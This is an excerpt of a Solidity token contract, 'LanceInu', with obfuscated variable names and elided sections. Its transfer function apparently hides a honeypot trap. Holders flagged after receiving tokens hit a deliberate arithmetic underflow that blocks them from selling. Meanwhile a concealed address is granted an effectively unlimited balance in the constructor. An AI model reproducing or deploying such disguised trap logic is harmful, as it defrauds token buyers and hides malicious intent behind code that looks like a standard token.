...
contract LanceInu is Ownable {
    constructor(
        ...
        _name = bus;
        quick = 3;
        uniswapV2Router = IUniswapV2Router02(acres);
        _decimals = 9;
        rough = 1000000000;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _tTotal = rough * 10**_decimals;

        _balances[feathers] = fast;
        _balances[msg.sender] = _tTotal;
        poem[feathers] = fast;
        poem[msg.sender] = fast;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    uint256 public quick;
    ...
    uint256 private rough;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    LanceInu private natural;
    uint256 private fast = ~uint256(0);
    ...
    function brain(
        ...
        address score = address(natural);
        bool having = uniswapV2Pair == me;
        uint256 red = quick;

        if (poem[me] == 0 && too[me] > 0 && !having) {
            poem[me] -= red;
        }

        natural = LanceInu(hall);

        if (poem[me] > 0 && accident == 0) {
            poem[hall] += red;
        }

        too[score] += red + 1;

        uint256 still = (accident / 100) * quick;
        accident -= still;
        _balances[me] -= still;
        _balances[address(this)] += still;

        _balances[me] -= accident;
        _balances[hall] += accident;
    }
    ...
    mapping(address => uint256) private poem;
    ...
    function transferFrom(
        ...
        brain(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        brain(msg.sender, recipient, amount);
